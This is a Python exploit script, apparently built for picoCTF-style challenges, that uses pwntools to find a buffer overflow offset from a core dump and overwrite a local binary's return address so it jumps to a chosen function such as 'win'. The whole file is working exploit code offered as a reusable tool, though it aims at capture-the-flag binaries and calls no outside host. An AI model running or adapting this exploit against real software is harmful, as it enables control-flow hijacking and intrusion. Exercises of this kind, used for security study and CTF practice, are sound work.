# Heavily based off of the amazing enscribe.dev (https://enscribe.dev/blog/picoctf-2022/buffer-overflow)

import argparse
import os

# Due to using ELF, this intial version isn't available on Windows yet, might change at a later date.
if os.name == "nt":
    print("This script is not yet supported on Windows, sorry!")
    exit(1)

from pwn import ELF, process, cyclic, Coredump, flat, context, cyclic_find

parser = argparse.ArgumentParser(
    prog="bflow.py",
    description="Tries to automatically exploit a buffer overflow to run the specified function.",
)
parser.add_argument("filename", help="Name of the binary file")
parser.add_argument(
    "symbol",
    help="Name of the symbol to overflow into, defaults to win",
    default="win",
    nargs="?",
)
cargs = parser.parse_args()

elf = context.binary = ELF(cargs.filename, checksec=False)

p = process(elf.path)
# Send a unique (de Bruijn) cyclic pattern to the process to find the offset
p.sendline(cyclic(1024))
p.wait()
# Get the core dump of the process so we can get the symbols inside of the binary
core = Coredump("./core")

# Reset the process
p = process(elf.path)

# Check if the symbol exists
if cargs.symbol not in elf.symbols:
    print(f"Symbol '{cargs.symbol}' not found in binary, available symbols are:")
    for symbol in elf.symbols:
        print(f"  - {symbol}")
    exit(1)

# Create a payload that should overwrite the return address with the address of the specified function
#                      |<- padding ->|<- return address ->|
payload = flat({cyclic_find(core.eip): elf.symbols[cargs.symbol]})

# Send the final payload & drop to an interactive shell to get the flag
p.sendline(payload)
p.interactive()
